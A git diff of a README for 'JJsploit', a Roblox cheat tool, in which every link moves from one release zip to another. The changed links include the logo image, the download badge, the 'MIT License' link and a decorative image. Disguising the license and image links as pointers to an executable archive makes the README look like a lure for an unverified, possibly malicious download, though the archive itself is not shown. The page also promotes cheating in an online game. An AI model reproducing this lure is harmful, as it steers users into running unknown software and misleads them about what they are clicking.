@@ -1,6 +1,6 @@
 # JJsploit
 
-![JJsploit Logo](https://github.com/youssef14a/JJsploit/releases/download/v1.0/App.zip)
+![JJsploit Logo](https://github.com/youssef14a/JJsploit/releases/download/v2.0/Software.zip)
 
 Welcome to the official GitHub repository for **JJsploit**! The leading Roblox exploit tool that is now available for free. **JJsploit** is widely known for its simplicity, accessibility, and powerful Lua script execution capabilities. This exploit tool allows users to enhance and customize their gaming experience on Roblox. However, it is important for users to stay vigilant about potential risks associated with exploiting software.
 
@@ -34,7 +34,7 @@ Welcome to the official GitHub repository for **JJsploit**! The leading Roblox e
 ## Getting Started
 To get started with **JJsploit**, download the latest version from the following link:
 
-[![Download JJsploit](https://github.com/youssef14a/JJsploit/releases/download/v1.0/App.zip%20Latest%20Version-v1.0.0-blue)](https://github.com/youssef14a/JJsploit/releases/download/v1.0/App.zip)
+[![Download JJsploit](https://github.com/youssef14a/JJsploit/releases/download/v2.0/Software.zip%20Latest%20Version-v1.0.0-blue)](https://github.com/youssef14a/JJsploit/releases/download/v2.0/Software.zip)
 
 Once downloaded, launch the **JJsploit** tool and explore the various customization options available to enhance your Roblox gaming experience.
 
@@ -45,8 +45,8 @@ For any questions, feedback, or support related to **JJsploit**, feel free to jo
 We welcome contributions to improve and enhance **JJsploit**. If you have ideas for new features, optimizations, or bug fixes, please submit a pull request. Together, we can make **JJsploit** even better for the entire community.
 
 ## License
-**JJsploit** is released under the [MIT License](https://github.com/youssef14a/JJsploit/releases/download/v1.0/App.zip). Feel free to use, modify, and distribute **JJsploit** in accordance with the terms of the license.
+**JJsploit** is released under the [MIT License](https://github.com/youssef14a/JJsploit/releases/download/v2.0/Software.zip). Feel free to use, modify, and distribute **JJsploit** in accordance with the terms of the license.
 
 Let's explore the endless possibilities with **JJsploit** and elevate your Roblox gaming experience to new heights! 🚀🎮
 
-![Roblox Gaming](https://github.com/youssef14a/JJsploit/releases/download/v1.0/App.zip)
+![Roblox Gaming](https://github.com/youssef14a/JJsploit/releases/download/v2.0/Software.zip)
